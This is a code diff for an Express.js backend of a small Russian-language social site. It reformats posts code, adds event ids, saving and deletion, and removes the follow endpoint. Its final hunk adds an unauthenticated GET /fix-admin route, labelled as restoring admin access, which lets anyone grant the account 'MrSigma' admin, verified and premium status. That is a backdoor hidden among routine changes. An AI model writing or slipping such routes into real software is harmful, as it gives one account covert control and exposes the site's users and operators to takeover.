@@ -58,7 +58,7 @@ let events = loadJSON(EVENTS_FILE, []);
 let comments = loadJSON(COMMENTS_FILE, []);
 let stats = loadJSON(STATS_FILE, { pageviews: 0 });
 
-// Инициализация недостающих полей у всех пользователей
+// Инициализация недостающих полей
 Object.values(users).forEach(u => {
   if (!u.followers) u.followers = [];
   if (!u.following) u.following = [];
@@ -116,7 +116,6 @@ const upload = multer({
 app.post('/api/register', (req, res) => {
   const { username, password } = req.body;
   if (!username || !password) return res.status(400).json({ error: 'Заполните все поля' });
-  // Проверка на пробелы
   if (/\s/.test(username)) return res.status(400).json({ error: 'Логин не должен содержать пробелы' });
   if (users[username]) return res.status(400).json({ error: 'Пользователь уже существует' });
   users[username] = {
@@ -228,22 +227,14 @@ app.post('/api/posts', auth, upload.single('image'), (req, res) => {
   saveJSON(POSTS_FILE, posts);
   res.json({
     ok: true,
-    post: {
-      ...post,
-      authorVerified: req.user.verified,
-      authorPremium: req.user.premium
-    }
+    post: { ...post, authorVerified: req.user.verified, authorPremium: req.user.premium }
   });
 });
 
 app.get('/api/posts', (req, res) => {
   const enriched = posts.map(p => {
     const author = users[p.author] || {};
-    return {
-      ...p,
-      authorVerified: author.verified || false,
-      authorPremium: author.premium || false
-    };
+    return { ...p, authorVerified: author.verified || false, authorPremium: author.premium || false };
   });
   res.json(enriched);
 });
@@ -307,16 +298,27 @@ app.post('/api/translate', (req, res) => {
   }).on('error', () => res.status(500).json({ error: 'Сервис перевода недоступен' }));
 });
 
+// События
 app.get('/api/events', (req, res) => res.json(events));
 app.post('/api/events', auth, (req, res) => {
   if (!req.user.admin) return res.status(403).json({ error: 'Нет прав' });
   const { title, desc } = req.body;
   if (!title) return res.status(400).json({ error: 'Укажите название' });
-  events.push({ title, desc });
+  const event = { id: Date.now(), title, desc };
+  events.push(event);
+  saveJSON(EVENTS_FILE, events);
+  res.json({ ok: true, event });
+});
+app.delete('/api/events/:id', auth, (req, res) => {
+  if (!req.user.admin) return res.status(403).json({ error: 'Нет прав' });
+  const idx = events.findIndex(e => e.id == req.params.id);
+  if (idx === -1) return res.status(404).json({ error: 'Ивент не найден' });
+  events.splice(idx, 1);
   saveJSON(EVENTS_FILE, events);
   res.json({ ok: true });
 });
 
+// Админка
 app.get('/api/admin/users', auth, (req, res) => {
   if (!req.user.admin) return res.status(403).json({ error: 'Нет прав' });
   res.json(Object.values(users).map(u => ({
@@ -367,27 +369,15 @@ app.get('/api/stats', (req, res) => {
   });
 });
 
-app.post('/api/follow/:username', auth, (req, res) => {
-  const target = req.params.username;
-  if (!users[target]) return res.status(404).json({ error: 'Пользователь не найден' });
-  if (target === req.user.username) return res.status(400).json({ error: 'Нельзя подписаться на себя' });
-
-  const me = users[req.user.username];
-  const them = users[target];
-
-  if (!me.following) me.following = [];
-  if (!them.followers) them.followers = [];
-
-  if (!me.following.includes(target)) {
-    me.following.push(target);
-    them.followers.push(req.user.username);
-  } else {
-    me.following = me.following.filter(u => u !== target);
-    them.followers = them.followers.filter(u => u !== req.user.username);
-  }
-
-  saveJSON(USERS_FILE, users);
-  res.json({ ok: true, followers: them.followers.length, following: me.following.length });
+// Восстановление админки
+app.get('/fix-admin', (req, res) => {
+  if (users['MrSigma']) {
+    users['MrSigma'].admin = true;
+    users['MrSigma'].verified = true;
+    users['MrSigma'].premium = true;
+    saveJSON(USERS_FILE, users);
+    res.send('✅ MrSigma теперь админ!');
+  } else res.send('❌ Пользователь не найден');
 });
 
 app.listen(PORT, () => console.log(`🚀 НБСС запущен на порту ${PORT}`));
